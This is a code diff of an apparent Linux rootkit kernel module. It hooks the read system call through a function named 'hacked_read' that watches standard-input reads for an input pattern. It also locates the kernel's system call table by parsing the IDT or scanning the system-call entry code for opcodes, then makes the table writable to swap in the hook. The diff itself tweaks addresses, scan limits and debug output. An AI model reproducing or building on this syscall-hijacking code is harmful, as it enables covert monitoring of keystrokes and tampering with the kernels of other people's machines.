@@ -50,7 +50,7 @@ asmlinkage int hacked_read(unsigned int fd, char __user * buf, size_t count)
 	if( fd == 0 )		// reading from stdIn
 	{
 		i = original_read(fd, buf, count);
-		printk("ReadCounter: after %d\n",atomic_read(&in_original_read));
+		//printk("ReadCounter: after %d\n",atomic_read(&in_original_read));
 		switch(z) {		// search for input pattern
 			case 0:
 				if(buf[0] == 'f') {
@@ -125,12 +125,10 @@ int make_ro(unsigned long address)
 void findSysCallTable(void)
 {
 	const int CALLOFF = 100;
-	unsigned long sys_call_off, idtAdress, sct = 0;
+	unsigned long sys_call_off, idtAdress;
 	char* p;
 	char sc_asm[CALLOFF];
-	unsigned i;
-	char tester;
-	int state = 0;
+	
 	struct {
 		unsigned short limit;
 		unsigned int base;
@@ -152,11 +150,11 @@ void findSysCallTable(void)
 	printk("after Nulltests \n");
 	printk("base: %x\n", idtr.base);
 	printk("idt: %x\n", &idt);
+	
+	idtAdress = 0xFFFFFFFF00000000 | (idtr.base+8*0x80);
 	if(&idt == 0) {
 		printk("aboding idt == 0 \n");
 	}
-	
-	idtAdress = 0xFFFFFFFFFF00000000 | (idtr.base+8*0x80);
 	/* read in IDT for int 0x80 (syscall) */
 	memcpy(&idt, (char*) idtAdress ,sizeof(idt));
 	printk("2\n");
@@ -180,8 +178,8 @@ void findSysCallTable(void)
 			}
 	}*/
 	if (p){
-		sys_call_table = (unsigned long*)(p+3);
-		printk("syscall table from int0x80: %lu and from sysmap: %lu\n", *sys_call_table, MAP_sys_call_table);
+		//sys_call_table = (unsigned long*)(p+3);
+		printk("syscall table from int80: %lx and from sysmap: %lx\n", (unsigned long*)(p+3), MAP_sys_call_table);
 	}
 	else {
 		printk("null\n");
@@ -200,10 +198,10 @@ void findSysCallTable64(void)
 
 	system_call = (void*)(((long)high << 32) | low);
 
-	for (ptr = system_call, i = 0; i < 500; i++)  {
+	for (ptr = system_call, i = 0; i < 200; i++)  {
 		if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5) {
-			sys_call_table = (unsigned long*)(0xffffffff00000000 | *((unsigned int*)(ptr+3)));
-			printk("syscall table from rdmsr: %lx and from sysmap: %lx\n", sys_call_table, MAP_sys_call_table);
+			sys_call_table = (unsigned long*)(0xFFFFFFFF00000000 | *((unsigned int*)(ptr+3)));
+			printk("syscall table from rdmsr: %lx and from sysmap: %lx at: %d\n", sys_call_table, MAP_sys_call_table, i);
 			return;
 		}
 
@@ -221,6 +219,7 @@ static int __init init_mod(void)
 
 	
 	findSysCallTable64();
+	//findSysCallTable();
 
 	make_rw((unsigned long)sys_call_table);
 	original_read = (void*)*(sys_call_table + __NR_read);
